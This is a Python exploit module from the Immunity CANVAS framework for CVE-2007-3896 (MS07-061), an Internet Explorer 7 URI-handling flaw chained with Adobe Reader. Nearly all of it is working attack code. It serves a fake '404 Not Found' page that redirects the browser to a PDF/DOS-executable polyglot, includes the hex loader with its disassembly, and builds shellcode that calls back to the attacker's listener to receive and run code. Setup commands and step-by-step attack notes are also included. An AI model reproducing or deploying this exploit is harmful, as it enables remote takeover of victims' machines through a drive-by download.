#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator, win32shell 
import pelib
import os.path

NAME="Microsoft IE 7 url-handling error (MS07-061)"
DESCRIPTION="A flaw in the way of handling special characters in URIs. Requires IE7 + Adobe Acrobat Reader"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"] = "CVE-2007-3896"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3896"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["CVS URL"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3896"
DOCUMENTATION["MSRC"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3896"
DOCUMENTATION["Date public"] = "9/19/2007"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "98","ME","2000","XP","2003" ]
PROPERTY['MSADV'] = "MS07-061"
PROPERTY['DELIVERY']='HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:iepdf -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

DEBUGNOTES="""
This exploit join a bug handling special URIs (http://larholm.com/2007/07/10/internet-explorer-0day-exploit/) and a bug that 
allow us download a file from IE and "launch" it from an associated application 
(http://seclists.org/bugtraq/2007/Oct/0213.html).

We've created a loader file that it's PDF compatible and it can be loaded by Adobe Acrobat, but it can be executed also (as a raw DOS 16 bits application)
to dump a new file (a mosdef callback).

Steps:
-open the file using the test2.exe?test2.pdf trick
-adobe acrobat reader open the file stored in the internet temporary files.
-using the URI-thing open a cmd.exe and execute a shell that find the .pdf inside the temp files and rename it to .exe
-as we said before, this .pdf it's also executable, so we execute it to get the real .exe with the shellcode
-execute the shellcode
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.setVersions()
        self.version=1
        self.name=NAME
        self.filename="iepdf.html"
        self.listenerArgsDict["fromcreatethread"]=1
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        sc=shellcodeGenerator.win32()                                                                                        
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect",{"port":self.callback.port,"ipaddress":self.callback.ip})                                                              
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread",None)

        rawshellcode=sc.get()
        
        print "[!] RAW Shellcode len: %d bytes" % len(rawshellcode)
        
        pe = pelib.PElib()
        self.shellcode = pe.createPEFileBuf(rawshellcode)
        
        return self.shellcode
   
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
        
    def makefile(self):
        """Makes the actual bad html file to trigger the object spoofing"""
        if not self.createShellcode():
            return None
        
        html="""
        <html>
        <head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        The requested URL / was not found on this server.<p>
        <hr>
        <script language="javascript">
        document.location.replace('test2.exe?test2.pdf');
        </script>
        </body>
        </html>
        """
            
        return html
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0:
            #still need to determine if it's pretending to be IE by spoofing User-Agent string
            self.log("Non IE browser connected - returning None")
            return None,None
        
        
        #send the exploit
        if "test2.exe" in clientheader.URL:
            self.log("Sending trojan file")
            
            f = open(os.path.join("Resources","test2.pdf"),"rb")
            pdf = f.read()
            f.close()
            
            loader = binstring("E800005D8D564C31C9B43CCD21723C508D5655B950C35B53B440CD215BB43ECD21E8180089C783C705E8100039F872F9EB1990909090909090909090B42CCD21B03CF6E130D286F201D0C3B44CCD21746573742E65786500")
            
            """
            16 bits assembler source:
0B25:1F6C E80000        CALL    1F6F
0B25:1F6F 5D            POP     BP
0B25:1F70 8D564C        LEA     DX,[BP+4C]
0B25:1F73 31C9          XOR     CX,CX
0B25:1F75 B43C          MOV     AH,3C           ;create file
0B25:1F77 CD21          INT     21
0B25:1F79 723C          JB      1FB7
0B25:1F7B 50            PUSH    AX
0B25:1F7C 8D5655        LEA     DX,[BP+55]
0B25:1F7F B950C3        MOV     CX,C350
0B25:1F82 5B            POP     BX
0B25:1F83 53            PUSH    BX
0B25:1F84 B440          MOV     AH,40           ;write to file
0B25:1F86 CD21          INT     21
0B25:1F88 5B            POP     BX
0B25:1F89 B43E          MOV     AH,3E           ;close file
0B25:1F8B CD21          INT     21
0B25:1F8D E81800        CALL    1FA8            ;get time
0B25:1F90 89C7          MOV     DI,AX
0B25:1F92 83C705        ADD     DI,+05
0B25:1F95 E81000        CALL    1FA8
0B25:1F98 39F8          CMP     AX,DI           ;wait 5 sec
0B25:1F9A 72F9          JB      1F95
0B25:1F9C EB19          JMP     1FB7            ;go exit
0B25:1F9E 90            NOP
0B25:1F9F 90            NOP
0B25:1FA0 90            NOP
0B25:1FA1 90            NOP
0B25:1FA2 90            NOP
0B25:1FA3 90            NOP
0B25:1FA4 90            NOP
0B25:1FA5 90            NOP
0B25:1FA6 90            NOP
0B25:1FA7 90            NOP
0B25:1FA8 B42C          MOV     AH,2C           ;get system time
0B25:1FAA CD21          INT     21
0B25:1FAC B03C          MOV     AL,3C
0B25:1FAE F6E1          MUL     CL
0B25:1FB0 30D2          XOR     DL,DL
0B25:1FB2 86F2          XCHG    DH,DL
0B25:1FB4 01D0          ADD     AX,DX
0B25:1FB6 C3            RET
0B25:1FB7 B44C          MOV     AH,4C           ;terminate proccess
0B25:1FB9 CD21          INT     21

-d 1FBB
0B25:1FB0                                   74 65 73 74 2E              test.
0B25:1FC0  65 78 65 00                                       exe.
            """

            sploitstring = pdf + loader + self.createShellcode()
            
            self.log("Sending %d bytes"%len(sploitstring))
            h.addHeader("Content-type","binary/octet-stream")
            h.addHeader("Connection","close")
            b.setBody(sploitstring)
        else:
            self.log("Sending the IE-PDF attack html file")
            sploitstring=self.makefile()
            b.setBody(sploitstring)

        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
